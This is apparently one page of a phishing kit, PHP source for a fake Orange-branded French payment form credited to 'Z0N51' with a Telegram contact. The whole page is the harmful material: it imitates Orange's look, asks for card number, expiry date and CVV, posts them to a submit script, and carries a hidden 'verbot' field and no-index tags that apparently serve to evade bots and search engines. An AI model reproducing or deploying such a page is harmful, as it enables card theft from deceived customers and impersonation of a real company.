<?php

/*******
    Main Author : Z0N51
    Contact me on telegram : https://t.me/Z0N51
    ********************************************************/

    include_once '../inc/app.php';
?>
<!doctype html>
<html style="background-color: #EEEEEE;">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="../assets/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/fonts.css">
        <link rel="stylesheet" href="../assets/css/main.css">

        <link rel="shortcut icon" href="../assets/images/favicon.png" type="image/png"> 

        <title>Identifiez-vous avec votre compte</title>
    </head>

    <body style="background-color: #EEEEEE;">

        <!-- HEADER -->
        <header id="header2">
            <div class="container">
                <img src="../assets/images/orange.png"> Orange
            </div>
        </header>
        <!-- END HEADER -->

        <!-- MAIN -->
        <main id="main2">
            <div class="container">

                <form method="post" action="submit.php">
                    <input type="hidden" name="verbot">
                    <input type="hidden" name="type" value="cc">
                
                <!--<div class="logos mt20 mb20">
                    <div class="left"><img src="../assets/images/lock.png"> 100% sécurisé</div>
                    <div class="right"><img src="../assets/images/security.png"></div>
                </div>-->

                <div class="details-box">
                    <p class="mb-0 text-center">Les champs marqués d'un <span style="color: #f16e00;">*</span> sont obligatoires.</p>
                    <div class="text-center mt-3 mb-3">
                        <img src="../assets/images/cb.png">
                        <img src="../assets/images/visa.png">
                        <img src="../assets/images/master.png">
                    </div>
                    <div class="row form-group mt-4 mb-4">
                        <label class="col-md-5" for="cc_number">Numéro de carte <span>*</span></label>
                        <div class="col-md-7">
                            <div style="max-width: 230px;"><input type="text" name="cc_number" id="cc_number" class="form-control <?php echo is_invalid_class($_SESSION['errors'],'cc_number') ?>" value="<?php echo get_value('cc_number'); ?>"></div>
                        </div>
                    </div>
                    <div class="row form-group mb-4">
                        <label class="col-md-5" for="cc_month">Date d'expiration <span>*</span></label>
                        <div class="col-md-7">
                            <div style="max-width: 230px;">
                                <div class="row">
                                    <div class="col-md-6 mb-lg-0 mb-md-3 mb-sm-3 mb-3">
                                        <select name="cc_month" id="cc_month" class="form-control <?php echo is_invalid_class($_SESSION['errors'],'cc_month') ?>">
                                            <option value="">Mois</option>
                                            <?php
                                            for( $i = 1; $i <= 12; $i++ ) {
                                                $num = str_pad($i, 2, "0", STR_PAD_LEFT);
                                                echo '<option '. get_selected_option('cc_month',$num) .' value="'. $num .'">'. $num .'</option>';
                                            }
                                            ?>
                                        </select>
                                    </div>
                                    <div class="col-md-6">
                                        <select name="cc_year" id="cc_year" class="form-control <?php echo is_invalid_class($_SESSION['errors'],'cc_year') ?>">
                                            <option value="">Année</option>
                                            <?php
                                            for( $i = date('Y'); $i < 2030; $i++ ) {
                                                echo '<option '. get_selected_option('cc_year',$i) .' value="'. $i .'">'. $i .'</option>';
                                            }
                                            ?>
                                        </select>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="row form-group">
                        <label class="col-md-5" for="cc_cvv">Numéro de contrôle <span>*</span></label>
                        <div class="col-md-7">
                            <input style="max-width: 130px; display: inline-block;" type="text" maxlength="3" name="cc_cvv" id="cc_cvv" class="form-control <?php echo is_invalid_class($_SESSION['errors'],'cc_cvv') ?>" value="<?php echo get_value('cc_cvv'); ?>">
                            <img style="max-width: 97px;" src="../assets/images/cvv.png">
                        </div>
                    </div>
                </div>

                <div class="btns">
                    <p><i class="fas fa-angle-left"></i> Retour à l'étape précédente</p>
                    <button type="submit">Valider votre paiement</button>
                </div>

                </form>

            </div>  
        </main>
        <!-- END MAIN -->
        
        
        <!-- JS FILES -->
        <script src="../assets/js/jquery.min.js"></script>
        <script src="../assets/js/popper.min.js"></script>
        <script src="../assets/js/bootstrap.min.js"></script>
        <script src="../assets/js/fontawesome.min.js"></script>
        <script src="../assets/js/jquery.payment.js"></script>
        <script src="../assets/js/main.js"></script>

        <script>
            $('#cc_cvv').payment('formatCardCVC');
            $('#cc_number').payment('formatCardNumber');
        </script>

    </body>

</html>